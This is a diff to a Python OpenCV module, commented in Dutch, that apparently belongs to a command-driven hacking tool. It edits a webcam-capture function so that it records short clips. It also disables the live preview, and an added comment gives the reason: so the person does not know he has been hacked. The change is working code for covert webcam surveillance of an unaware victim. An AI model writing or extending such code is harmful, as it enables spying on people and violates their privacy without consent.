@@ -1,5 +1,7 @@
 import cv2
 import os
+import time
+
 
 # deze file bevat alle functies die aangeroepen worden wanneer een command uitgevoerd wordt
 
@@ -61,15 +63,23 @@ def get_camRecording():
     frame_height = int(cam.get(cv2.CAP_PROP_FRAME_HEIGHT))
 
     # VideoWriter object aanmaken om de opname als mp4 op te slaan in de filepath=/video folder
-    fourcc = cv2.VideoWriter_fourcc(*'mp4v')
+    fourcc = cv2.VideoWriter_fourcc(*'avc1')
     out = cv2.VideoWriter(filepath, fourcc, 20.0, (frame_width, frame_height))
 
     # zolang de whileloop true is wordt webcam gebruikt om video te maken
+
+    start_time = time.time()
     while True:
         ret, frame = cam.read()
 
         out.write(frame)
-        cv2.imshow('Camera', frame)
+
+        # zien wat record wordt op scherm, uit omdat je niet wilt dat de persoon weet dat hij gehackt is
+        # cv2.imshow('Camera', frame)
+
+        # als de video langer dan 5 seconden wordt, stop de video
+        if time.time() - start_time > 5:
+            break
 
         # als q geklikt wordt beindig video
         if cv2.waitKey(1) == ord('q'):
